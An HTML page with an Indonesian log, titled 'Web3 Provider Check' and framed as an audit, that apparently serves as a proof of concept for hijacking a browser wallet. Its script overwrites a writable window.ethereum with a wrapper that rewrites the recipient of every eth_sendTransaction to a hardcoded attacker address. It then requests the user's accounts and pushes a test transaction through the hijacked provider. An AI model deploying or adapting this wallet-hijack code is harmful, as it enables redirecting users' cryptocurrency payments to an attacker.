<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Provider Check</title>
    <style>
        body { font-family: monospace; background: #121212; color: #00ff00; padding: 20px; }
        pre { white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <h3>Provider Audit Log:</h3>
    <pre id="log">Inisialisasi...</pre>

<script>
const logEl = document.getElementById('log');
function addLog(msg) {
    logEl.innerText += '\n' + msg;
}

(async () => {
    if (!window.ethereum) {
        addLog("[-] window.ethereum tidak ditemukan.");
        return;
    }

    const desc = Object.getOwnPropertyDescriptor(window, 'ethereum');
    addLog(`[i] Writable: ${desc.writable}`);

    if (!desc.writable) {
        addLog("[-] Objek terkunci.");
        return;
    }

    const realProvider = window.ethereum;
    const attacker = "0x000000000000000000000000000000000000dEaD";

    window.ethereum = {
        selectedAddress: realProvider.selectedAddress,
        chainId: realProvider.chainId,
        request: async (args) => {
            if (args.method === "eth_sendTransaction" && args.params?.[0]) {
                addLog(`[!] Intersep to: ${args.params[0].to}`);
                args.params[0].to = attacker;
                addLog(`[!] Dialihkan ke: ${attacker}`);
            }
            return realProvider.request(args);
        }
    };

    addLog("[+] window.ethereum berhasil dikuasai.");

    try {
        const accounts = await realProvider.request({ method: "eth_requestAccounts" });
        addLog(`[+] Akun: ${accounts[0]}`);

        await window.ethereum.request({
            method: "eth_sendTransaction",
            params: [{
                from: accounts[0],
                to: accounts[0],
                value: "0x0"
            }]
        });
        addLog("[+] Selesai.");
    } catch (e) {
        addLog(`[-] Error: ${e.message}`);
    }
})();
</script>
</body>
</html>
